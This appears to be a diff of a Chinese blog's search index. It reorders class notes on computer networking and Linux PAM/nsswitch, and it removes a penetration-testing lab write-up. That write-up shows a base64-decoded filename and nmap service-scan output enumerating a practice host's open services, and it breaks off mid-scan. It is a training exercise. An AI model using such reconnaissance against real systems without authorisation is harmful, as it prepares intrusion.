-<h3 id="中国发出的第一封电子邮件">中国发出的第一封电子邮件</h3>
-<ul>
-<li>时间：1987年9月14日21时07分</li>
-<li>地点：北京计算机应用技术研究所-&gt;德国卡尔斯鲁厄大学</li>
-<li>人物：吴为民、王运丰</li>
-<li>内容：越过长城，走向世界。Across the Great Wall we can reach every corner in the world.</li>
-</ul>
-<h3 id="中国管理互联网资源的机构">中国管理互联网资源的机构</h3>
-<ul>
-<li>中国互联网络信息中心</li>
-</ul>
-<h3 id="拓扑结构">拓扑结构</h3>
-<h4 id="总线拓扑-主机挂接在总线上互相直接通达">总线拓扑-主机挂接在总线上，互相直接通达</h4>
-<ul>
-<li>主线发出的信号在总线上双向传输</li>
-<li>所有主机都可以接收到此信号</li>
-</ul>
-<h4 id="星形拓扑-主机挂接在一个中心节点上">星形拓扑-主机挂接在一个中心节点上</h4>
-<ul>
-<li>早期的中心节点由集线器充当</li>
-<li>现在的中心节点由交换机充当</li>
-</ul>
-<h4 id="环形结构">环形结构</h4>
-<h4 id="树形结构">树形结构</h4>
-<h4 id="网状结构">网状结构</h4>
-<h3 id="协议">协议</h3>
-<h4 id="是一种规范规定了网络设备之间如何交换数据互相理解">是一种规范，规定了网络设备之间如何交换数据，互相理解</h4>
-<h3 id="带宽">带宽</h3>
-<h4 id="数字带宽">数字带宽</h4>
-<ul>
-<li>数字带宽是指在一个固定的时间内可传输的最大比特数据的量</li>
-<li>基本单位比特每秒【bit/s】：bps</li>
-</ul>
-<h4 id="常见单位">常见单位</h4>
-<ul>
-<li>Kbps</li>
-<li>Mbps</li>
-<li>Gbps</li>
-<li>Tbps 通常说的带宽是理想数字带宽</li>
-</ul>
-<h4 id="吞吐率是实际带宽">吞吐率是实际带宽</h4>
-<ul>
-<li>吞吐率是指在固定时间内成功传输的比特数据的量</li>
-<li>吞吐率受很多条件影响，计算机性能，传输介质等</li>
-</ul>
-<h3 id="下载时间计算">下载时间计算</h3>
-<p>S代表信息量 T代表下载时间</p>
-<h4 id="理想型">理想型</h4>
-<ul>
-<li><span class="math inline">\(T=\frac{S}{BW}\)</span> BW代表带宽</li>
-</ul>
-<h4 id="现实型">现实型</h4>
-<ul>
-<li><span class="math inline">\(T=\frac{S}{P}\)</span> P代表吞吐量</li>
-</ul>
-<h3 id="网络连接方式">网络连接方式</h3>
-<h4 id="点到点">点到点</h4>
-<ul>
-<li>计算机直接相连</li>
-<li>计算机和交换机相连</li>
-<li>电脑到通信局的电脑相连</li>
-</ul>
-<h4 id="端到端">端到端</h4>
-<ul>
-<li>虚连接，由一个一个点到点连接构成，类似链</li>
-</ul>
-<h3 id="计算机网络的分类">计算机网络的分类</h3>
-<h4 id="按传输介质">按传输介质</h4>
-<ul>
-<li>有线网络</li>
-<li>无线网络</li>
-</ul>
-<h4 id="按覆盖范围划分">按覆盖范围划分</h4>
-<ul>
-<li>PAN（Personal Area Network） 个域网 1米左右</li>
-<li>LAN（Local Area Network） 局域网 1公里左右</li>
-<li>MAN （Mertopolian Area Network）城域网 10公里左右</li>
-<li>WAN （Wide Area Network）广域网 100-1000公里</li>
-<li>Internet 互联网 全球</li>
-</ul>
-]]></content>
-      <categories>
-        <category>大学</category>
       </categories>
   </entry>
   <entry>
@@ -4701,6 +4561,268 @@ A\overrightarrow{x}=\overrightarrow{v}
       </categories>
   </entry>
   <entry>
+    <title>计算机网络第一节课笔记</title>
+    <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<a href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0.pdf" title="计算机网络第一节课笔记pdf文档下载">计算机网络第一节课笔记pdf文档下载</a>
+<a id="more"></a>
+<h1 id="计算机网络第一节课">计算机网络第一节课</h1>
+<h3 id="网络分类">网络分类</h3>
+<ul>
+<li>从逻辑上看,计算机网络分为资源子网和通信子网</li>
+</ul>
+<h3 id="互联网起源">互联网起源</h3>
+<ul>
+<li>美国的阿帕网(ARPANET)</li>
+</ul>
+<h3 id="中国发出的第一封电子邮件">中国发出的第一封电子邮件</h3>
+<ul>
+<li>时间：1987年9月14日21时07分</li>
+<li>地点：北京计算机应用技术研究所-&gt;德国卡尔斯鲁厄大学</li>
+<li>人物：吴为民、王运丰</li>
+<li>内容：越过长城，走向世界。Across the Great Wall we can reach every corner in the world.</li>
+</ul>
+<h3 id="中国管理互联网资源的机构">中国管理互联网资源的机构</h3>
+<ul>
+<li>中国互联网络信息中心</li>
+</ul>
+<h3 id="拓扑结构">拓扑结构</h3>
+<h4 id="总线拓扑-主机挂接在总线上互相直接通达">总线拓扑-主机挂接在总线上，互相直接通达</h4>
+<ul>
+<li>主线发出的信号在总线上双向传输</li>
+<li>所有主机都可以接收到此信号</li>
+</ul>
+<h4 id="星形拓扑-主机挂接在一个中心节点上">星形拓扑-主机挂接在一个中心节点上</h4>
+<ul>
+<li>早期的中心节点由集线器充当</li>
+<li>现在的中心节点由交换机充当</li>
+</ul>
+<h4 id="环形结构">环形结构</h4>
+<h4 id="树形结构">树形结构</h4>
+<h4 id="网状结构">网状结构</h4>
+<h3 id="协议">协议</h3>
+<h4 id="是一种规范规定了网络设备之间如何交换数据互相理解">是一种规范，规定了网络设备之间如何交换数据，互相理解</h4>
+<h3 id="带宽">带宽</h3>
+<h4 id="数字带宽">数字带宽</h4>
+<ul>
+<li>数字带宽是指在一个固定的时间内可传输的最大比特数据的量</li>
+<li>基本单位比特每秒【bit/s】：bps</li>
+</ul>
+<h4 id="常见单位">常见单位</h4>
+<ul>
+<li>Kbps</li>
+<li>Mbps</li>
+<li>Gbps</li>
+<li>Tbps 通常说的带宽是理想数字带宽</li>
+</ul>
+<h4 id="吞吐率是实际带宽">吞吐率是实际带宽</h4>
+<ul>
+<li>吞吐率是指在固定时间内成功传输的比特数据的量</li>
+<li>吞吐率受很多条件影响，计算机性能，传输介质等</li>
+</ul>
+<h3 id="下载时间计算">下载时间计算</h3>
+<p>S代表信息量 T代表下载时间</p>
+<h4 id="理想型">理想型</h4>
+<ul>
+<li><span class="math inline">\(T=\frac{S}{BW}\)</span> BW代表带宽</li>
+</ul>
+<h4 id="现实型">现实型</h4>
+<ul>
+<li><span class="math inline">\(T=\frac{S}{P}\)</span> P代表吞吐量</li>
+</ul>
+<h3 id="网络连接方式">网络连接方式</h3>
+<h4 id="点到点">点到点</h4>
+<ul>
+<li>计算机直接相连</li>
+<li>计算机和交换机相连</li>
+<li>电脑到通信局的电脑相连</li>
+</ul>
+<h4 id="端到端">端到端</h4>
+<ul>
+<li>虚连接，由一个一个点到点连接构成，类似链</li>
+</ul>
+<h3 id="计算机网络的分类">计算机网络的分类</h3>
+<h4 id="按传输介质">按传输介质</h4>
+<ul>
+<li>有线网络</li>
+<li>无线网络</li>
+</ul>
+<h4 id="按覆盖范围划分">按覆盖范围划分</h4>
+<ul>
+<li>PAN（Personal Area Network） 个域网 1米左右</li>
+<li>LAN（Local Area Network） 局域网 1公里左右</li>
+<li>MAN （Mertopolian Area Network）城域网 10公里左右</li>
+<li>WAN （Wide Area Network）广域网 100-1000公里</li>
+<li>Internet 互联网 全球</li>
+</ul>
+]]></content>
+      <categories>
+        <category>大学</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>计算机网络第三节课笔记-物理层</title>
+    <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%B8%89%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%89%A9%E7%90%86%E5%B1%82/</url>
+    <content><![CDATA[
+<a id="more"></a>
+<p>#物理层</p>
+<h2 id="传输介质">传输介质</h2>
+<h3 id="分类">分类</h3>
+<h4 id="导引性-有线">导引性-有线</h4>
+<ul>
+<li>铜线</li>
+<li>光缆</li>
+</ul>
+<h4 id="非导引性-无限">非导引性-无限</h4>
+<ul>
+<li>无线电</li>
+<li>卫星</li>
+</ul>
+<h3 id="有线">有线</h3>
+<h4 id="同轴电缆">同轴电缆</h4>
+<ul>
+<li>基带同轴电缆
+<ul>
+<li>50Ω，用于数字传输（屏蔽层为铜）</li>
+</ul></li>
+<li>宽带同轴电缆
+<ul>
+<li>75Ω，用于模拟传输（）屏蔽层为铝</li>
+</ul></li>
+<li>粗缆
+<ul>
+<li>最大传输距离500m，两端安装终接器，确保电缆屏蔽层接地</li>
+</ul></li>
+<li>细缆
+<ul>
+<li>最大传输距离为185m，两头按住概念<strong>BNC</strong><a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>头，接在<strong>T型连接器</strong><a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>两端</li>
+</ul></li>
+</ul>
+<h4 id="双绞线">双绞线</h4>
+<ul>
+<li><p>逆时针方向绞合而成</p>
+<ul>
+<li>用于消除近端串扰 Crosstalk<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></li>
+<li>绞距越小，越均匀，抵消效果越好，传输性能越好（高类网线和低类网线一个重要区别就是绞距不同<a href="#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a>）</li>
+</ul></li>
+<li><p>非屏蔽双绞线-UTP</p>
+<ul>
+<li>优点</li>
+<li>成本低
+<ul>
+<li>易于安装</li>
+<li>尺寸低</li>
+</ul></li>
+<li>缺点
+<ul>
+<li>易受干扰</li>
+<li>距离性能受到绞距影响</li>
+</ul></li>
+<li>五类双绞线
+<ul>
+<li>提供10-100M的数字带宽，其中两对线分别用于收、发</li>
+<li>1000M以太网中，用到了全部的四对线</li>
+<li>最大传输距离100m，广泛用于局域网</li>
+</ul></li>
+</ul></li>
+<li><p>屏蔽双绞线-STP</p>
+<ul>
+<li>优点
+<ul>
+<li>抗<strong>EMI</strong><a href="#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a>、<strong>RFI</strong><a href="#fn6" class="footnote-ref" id="fnref6" role="doc-noteref"><sup>6</sup></a>干扰</li>
+</ul></li>
+</ul></li>
+<li><p>缺点 - 成本高</p>
+<ul>
+<li>不易安装</li>
+</ul></li>
+<li><p>加了两层屏蔽层，用于每对线和全部四对线外</p></li>
+<li><p>网屏双绞线-ScTP</p>
+<ul>
+<li>每个线对的屏蔽层去掉</li>
+</ul></li>
+<li><p>线序</p>
+<ul>
+<li>直通线
+<ul>
+<li>不同设备</li>
+</ul></li>
+<li>交叉线
+<ul>
+<li>同种设备</li>
+</ul></li>
+</ul></li>
+</ul>
+<p>电力线</p>
+<ul>
+<li>没有普及，未来技术</li>
+</ul>
+<h4 id="光纤">光纤</h4>
+<ul>
+<li>构成
+<ul>
+<li>光导纤维</li>
+<li>玻璃覆盖层</li>
+<li>外层</li>
+</ul></li>
+<li>原理
+<ul>
+<li>光的全反射
+<ul>
+<li>当光从光密物质射向光疏物质，入射角大于临界角，光发生全反射</li>
+<li>光全锁闭在光密物质中，全反射钱箱</li>
+</ul></li>
+</ul></li>
+<li>优点
+<ul>
+<li>重量轻
+<ul>
+<li>非常细的光导纤维</li>
+</ul></li>
+<li>损耗低</li>
+<li>不受电磁干扰影响</li>
+<li>带宽、容量大</li>
+</ul></li>
+<li>缺点
+<ul>
+<li>昂贵</li>
+<li>易断裂</li>
+</ul></li>
+<li>分类
+<ul>
+<li>单模光纤</li>
+<li>多模光纤</li>
+</ul></li>
+<li>光传输系统构成
+<ul>
+<li>光源</li>
+<li>传输介质</li>
+<li>探测器</li>
+</ul></li>
+<li>修复
+<ul>
+<li>光纤连接器</li>
+<li>机械拼接，直接使用套管夹紧 10%损耗</li>
+<li>熔合 无损耗</li>
+</ul></li>
+</ul>
+<section class="footnotes" role="doc-endnotes">
+<hr />
+<ol>
+<li id="fn1" role="doc-endnote"><p>BNC接头是监控工程中用于摄像设备输出时导线和摄像机的连接头。<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+<li id="fn2" role="doc-endnote"><p>一个同轴结构的端处分成三个方向，外形成“T”形的高频的连接器。<a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+<li id="fn3" role="doc-endnote"><p>串扰在电子学上是指两条信号线之间的耦合现象。这是因为空间距离近的信号线之间会出现不希望的电感性和电容性耦合从而互相干扰。电容性耦合会引发耦合电流，而电感性耦合则引发耦合电压<a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+<li id="fn4" role="doc-endnote"><img src="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%B8%89%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%89%A9%E7%90%86%E5%B1%82/%E8%B6%85%E4%BA%94%E7%B1%BB%E7%BA%BF%E5%92%8C%E5%85%AD%E7%B1%BB%E7%BA%BF.png" class="" title="超五类线和六类线">
+<a href="#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></li>
+<li id="fn5" role="doc-endnote"><p>电磁干扰：Electromagnetic Interference-电磁干扰是指电子产品工作会对周边的其他电子产品造成干扰<a href="#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+<li id="fn6" role="doc-endnote"><p>射频干扰： Radio Frequency Interference-射频干扰是在接收机所接收的信号频率或非常接近此频率处产生的干扰<a href="#fnref6" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
+</ol>
+</section>
+]]></content>
+      <categories>
+        <category>大学</category>
+      </categories>
+  </entry>
+  <entry>
     <title>计算机网络第二节课笔记-计算机网络模型</title>
     <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%BA%8C%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/</url>
     <content><![CDATA[
@@ -4822,140 +4944,6 @@ A\overrightarrow{x}=\overrightarrow{v}
 ]]></content>
       <categories>
         <category>大学</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>认证与授权</title>
-    <url>/%E8%AE%A4%E8%AF%81%E4%B8%8E%E6%8E%88%E6%9D%83/</url>
-    <content><![CDATA[<h1 id="认证与授权">认证与授权</h1>
-<ul>
-<li>Authentication（认证）
-<ul>
-<li>用户的用户名和密码是否能通过检验。</li>
-</ul></li>
-<li>Authorizantion（授权）
-<ul>
-<li>用户是否被允许访问服务或资源。</li>
-</ul></li>
-</ul>
-<h1 id="nsswitchpam">nsswitch&amp;pam</h1>
-<a id="more"></a>
-<h2 id="nsswitch-提供名称解析">nsswitch-提供名称解析</h2>
-<h4 id="network-service-switch-网络服务转换">network service switch 网络服务转换</h4>
-<p><code>/etc/nsswitch.conf</code></p>
-<p>库文件路径<code>/usr/lib[64]/libnss*</code></p>
-<p>说白了就是名称解析，nss定义了以何种方式，何种途径，何种顺序来查找特定信息</p>
-<h4 id="返回机制">返回机制</h4>
-<ul>
-<li>SUCCESS
-<ul>
-<li>service ok,name found</li>
-</ul></li>
-<li>NOTFOUND
-<ul>
-<li>service ok,name not found</li>
-</ul></li>
-<li>UNAVAIL
-<ul>
-<li>service not available</li>
-</ul></li>
-<li>TRYAGAIN
-<ul>
-<li>temporary service failure-临时故障</li>
-</ul></li>
-</ul>
-<h5 id="返回了success不继续使用其他查找方式">返回了success，不继续使用其他查找方式</h5>
-<h4 id="返回动作">返回动作</h4>
-<ul>
-<li>return
-<ul>
-<li>返回</li>
-</ul></li>
-<li>continue
-<ul>
-<li>继续</li>
-</ul></li>
-</ul>
-<h4 id="查找方式">查找方式</h4>
-<ul>
-<li>files</li>
-<li>nis/nisplus</li>
-<li>dns</li>
-<li>db</li>
-</ul>
-<h5 id="服务名-查找方式-返回机制-更多查找方式">服务名： 查找方式 <a href="#返回机制">返回机制</a> 更多查找方式</h5>
-<p><code>passwd: nis [NOTFOUND=return] files</code></p>
-<hr />
-<h2 id="pam-提供认证">pam-提供认证</h2>
-<h3 id="pluggable-authentication-module-可插入式认证模块">Pluggable Authentication Module 可插入式认证模块</h3>
-<p><code>/etc/pam.d/service</code></p>
-<p>一个服务框架，用于认证功能，其他服务依赖于此机制，如果在nsswitch中使用了pam认证方式，pam就能使用特定的库来实现认证功能，通过配置文件对认证过程实现配置</p>
-<h4 id="type--类型组">type -类型/组</h4>
-<ul>
-<li>account</li>
-<li>auth</li>
-<li>password</li>
-<li>session</li>
-</ul>
-<h4 id="control-控制">control-控制</h4>
-<h5 id="根据返回值进行处理">根据返回值进行处理</h5>
-<ul>
-<li>required-<strong>需求</strong>
-<ul>
-<li>一票否决，必须满足</li>
-<li>无论是否通过检查，都继续检查</li>
-</ul></li>
-<li>requisite-<strong>必须的</strong>
-<ul>
-<li>真正的一票否决，必须满足</li>
-<li>只要检查不通过，就不用继续检查后面了，直接返回</li>
-</ul></li>
-<li>sufficient-<strong>充分条件</strong>
-<ul>
-<li>一票通过</li>
-<li>如果没通过，不干涉后续检查</li>
-</ul></li>
-<li>optional-<strong>可选</strong>
-<ul>
-<li>无所谓的选项</li>
-</ul></li>
-<li>include-<strong>移权给其他文件</strong></li>
-</ul>
-<h3 id="另一种控制方式">另一种控制方式</h3>
-<p><code>value1=action1 value2=action2 ……</code></p>
-<h4 id="value-返回值">value-返回值</h4>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">success、open_err、symbol_err、service_err、 system_err、buf_err、perm_denied、auth_err、cred_insufficient、authinfo_unavail、user_unknown、maxtries、new_authtok_reqd、acct_expired、 session_err、cred_unavail、cred_expired、cred_err、no_module_data、conv_err、 authtok_err、authtok_recover_err、authtok_lock_busy、authtok_disable_aging、 try_again、ignore、abort、authtok_expired、module_unknown、bad_item和default</span><br></pre></td></tr></table></figure>
-<h4 id="actions-动作动作">actions-动作/动作</h4>
-<ul>
-<li>ok
-<ul>
-<li>当前检查通过，继续检查</li>
-</ul></li>
-<li>done
-<ul>
-<li>一票通过，不继续检查，返回最终结果</li>
-</ul></li>
-<li>bad
-<ul>
-<li>当前检察失败，继续检查</li>
-</ul></li>
-<li>die
-<ul>
-<li>一票否决，不继续检查，返回最终结果</li>
-</ul></li>
-<li>ignore
-<ul>
-<li>忽略</li>
-</ul></li>
-<li>reset
-<ul>
-<li>忽略所有结果，重新继续</li>
-</ul></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type	control		module_name 	module_parameter</span><br><span class="line">auth	requisite	pam_successd_if.so uid &lt; 500 quit</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>运维</category>
       </categories>
   </entry>
   <entry>
@@ -5181,6 +5169,140 @@ S_{OOK}(t)=a_n \cdot Acos\omega_ct
 ]]></content>
   </entry>
   <entry>
+    <title>认证与授权</title>
+    <url>/%E8%AE%A4%E8%AF%81%E4%B8%8E%E6%8E%88%E6%9D%83/</url>
+    <content><![CDATA[<h1 id="认证与授权">认证与授权</h1>
+<ul>
+<li>Authentication（认证）
+<ul>
+<li>用户的用户名和密码是否能通过检验。</li>
+</ul></li>
+<li>Authorizantion（授权）
+<ul>
+<li>用户是否被允许访问服务或资源。</li>
+</ul></li>
+</ul>
+<h1 id="nsswitchpam">nsswitch&amp;pam</h1>
+<a id="more"></a>
+<h2 id="nsswitch-提供名称解析">nsswitch-提供名称解析</h2>
+<h4 id="network-service-switch-网络服务转换">network service switch 网络服务转换</h4>
+<p><code>/etc/nsswitch.conf</code></p>
+<p>库文件路径<code>/usr/lib[64]/libnss*</code></p>
+<p>说白了就是名称解析，nss定义了以何种方式，何种途径，何种顺序来查找特定信息</p>
+<h4 id="返回机制">返回机制</h4>
+<ul>
+<li>SUCCESS
+<ul>
+<li>service ok,name found</li>
+</ul></li>
+<li>NOTFOUND
+<ul>
+<li>service ok,name not found</li>
+</ul></li>
+<li>UNAVAIL
+<ul>
+<li>service not available</li>
+</ul></li>
+<li>TRYAGAIN
+<ul>
+<li>temporary service failure-临时故障</li>
+</ul></li>
+</ul>
+<h5 id="返回了success不继续使用其他查找方式">返回了success，不继续使用其他查找方式</h5>
+<h4 id="返回动作">返回动作</h4>
+<ul>
+<li>return
+<ul>
+<li>返回</li>
+</ul></li>
+<li>continue
+<ul>
+<li>继续</li>
+</ul></li>
+</ul>
+<h4 id="查找方式">查找方式</h4>
+<ul>
+<li>files</li>
+<li>nis/nisplus</li>
+<li>dns</li>
+<li>db</li>
+</ul>
+<h5 id="服务名-查找方式-返回机制-更多查找方式">服务名： 查找方式 <a href="#返回机制">返回机制</a> 更多查找方式</h5>
+<p><code>passwd: nis [NOTFOUND=return] files</code></p>
+<hr />
+<h2 id="pam-提供认证">pam-提供认证</h2>
+<h3 id="pluggable-authentication-module-可插入式认证模块">Pluggable Authentication Module 可插入式认证模块</h3>
+<p><code>/etc/pam.d/service</code></p>
+<p>一个服务框架，用于认证功能，其他服务依赖于此机制，如果在nsswitch中使用了pam认证方式，pam就能使用特定的库来实现认证功能，通过配置文件对认证过程实现配置</p>
+<h4 id="type--类型组">type -类型/组</h4>
+<ul>
+<li>account</li>
+<li>auth</li>
+<li>password</li>
+<li>session</li>
+</ul>
+<h4 id="control-控制">control-控制</h4>
+<h5 id="根据返回值进行处理">根据返回值进行处理</h5>
+<ul>
+<li>required-<strong>需求</strong>
+<ul>
+<li>一票否决，必须满足</li>
+<li>无论是否通过检查，都继续检查</li>
+</ul></li>
+<li>requisite-<strong>必须的</strong>
+<ul>
+<li>真正的一票否决，必须满足</li>
+<li>只要检查不通过，就不用继续检查后面了，直接返回</li>
+</ul></li>
+<li>sufficient-<strong>充分条件</strong>
+<ul>
+<li>一票通过</li>
+<li>如果没通过，不干涉后续检查</li>
+</ul></li>
+<li>optional-<strong>可选</strong>
+<ul>
+<li>无所谓的选项</li>
+</ul></li>
+<li>include-<strong>移权给其他文件</strong></li>
+</ul>
+<h3 id="另一种控制方式">另一种控制方式</h3>
+<p><code>value1=action1 value2=action2 ……</code></p>
+<h4 id="value-返回值">value-返回值</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">success、open_err、symbol_err、service_err、 system_err、buf_err、perm_denied、auth_err、cred_insufficient、authinfo_unavail、user_unknown、maxtries、new_authtok_reqd、acct_expired、 session_err、cred_unavail、cred_expired、cred_err、no_module_data、conv_err、 authtok_err、authtok_recover_err、authtok_lock_busy、authtok_disable_aging、 try_again、ignore、abort、authtok_expired、module_unknown、bad_item和default</span><br></pre></td></tr></table></figure>
+<h4 id="actions-动作动作">actions-动作/动作</h4>
+<ul>
+<li>ok
+<ul>
+<li>当前检查通过，继续检查</li>
+</ul></li>
+<li>done
+<ul>
+<li>一票通过，不继续检查，返回最终结果</li>
+</ul></li>
+<li>bad
+<ul>
+<li>当前检察失败，继续检查</li>
+</ul></li>
+<li>die
+<ul>
+<li>一票否决，不继续检查，返回最终结果</li>
+</ul></li>
+<li>ignore
+<ul>
+<li>忽略</li>
+</ul></li>
+<li>reset
+<ul>
+<li>忽略所有结果，重新继续</li>
+</ul></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type	control		module_name 	module_parameter</span><br><span class="line">auth	requisite	pam_successd_if.so uid &lt; 500 quit</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>运维</category>
+      </categories>
+  </entry>
+  <entry>
     <title>邮件服务相关</title>
     <url>/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E7%9B%B8%E5%85%B3/</url>
     <content><![CDATA[<h3 id="postfix邮件服务器">postfix邮件服务器</h3>
@@ -5194,25 +5316,6 @@ S_{OOK}(t)=a_n \cdot Acos\omega_ct
 ]]></content>
       <categories>
         <category>运维</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>靶场63</title>
-    <url>/%E9%9D%B6%E5%9C%BA63/</url>
-    <content><![CDATA[<p>先看看网站源代码 找到图片存放的位置,看到一个特殊文件名,base64解密</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AAEAAQAAAAAAAAdJAAAAJDhiNGY1YTk3LTQ3NTctNDE1Ny1hZmU4LTlhMWE4</span><br><span class="line">I$8b4f5a97-4757-4157-afe8-9a1a8</span><br></pre></td></tr></table></figure>
-<p>nmap <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># divint3 @ Divint3 in ~ [21:49:41] C:130</span></span><br><span class="line">$ nmap 172.17.135.63 -sV -Pn</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-27 21:53 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.63</span><br><span class="line">Host is up (0.020s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql       MySQL (unauthorized)</span><br><span class="line">6667/tcp open  irc         InspIRCd</span><br><span class="line">Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 11.79 seconds</span><br><span class="line"></span><br><span class="line"><span class="comment"># divint3 @ Divint3 in ~ [21:53:15] </span></span><br><span class="line">$ nmap 172.17.135.63 -sV -Pn -A</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2019-05-27 21:53 CST</span><br><span class="line">Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.87% <span class="keyword">done</span>; ETC: 21:54 (0:00:00 remaining)</span><br><span class="line">Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.87% <span class="keyword">done</span>; ETC: 21:54 (0:00:00 remaining)</span><br><span class="line">Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.87% <span class="keyword">done</span>; ETC: 21:54 (0:00:00 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.17.135.63</span><br><span class="line">Host is up (0.015s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 b5:38:66:0f:a1:ee:<span class="built_in">cd</span>:41:69:3b:82:cf:ad:a1:f7:13 (DSA)</span><br><span class="line">|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)</span><br><span class="line">|_  256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-generator: Silex v2.2.7</span><br><span class="line">| http-robots.txt: 4 disallowed entries </span><br><span class="line">|_/old/ /<span class="built_in">test</span>/ /TR2/ /Backnode_files/</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Backnode</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql       MySQL (unauthorized)</span><br><span class="line">6667/tcp open  irc         InspIRCd</span><br><span class="line">| irc-info: </span><br><span class="line">|   server: Admin.local</span><br><span class="line">|   users: 1.0</span><br><span class="line">|   servers: 1</span><br><span class="line">|   chans: 0</span><br><span class="line">|   lusers: 1</span><br><span class="line">|   lservers: 0</span><br><span class="line">|   <span class="built_in">source</span> ident: nmap</span><br><span class="line">|   <span class="built_in">source</span> host: 10.160.110.191</span><br><span class="line">|_  error: Closing link: (nmap@10.160.110.191) [Client exited]</span><br><span class="line">Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 40m48s, deviation: 0s, median: 40m48s</span><br><span class="line">|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: lazysysadmin</span><br><span class="line">|   NetBIOS computer name: LAZYSYSADMIN\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: 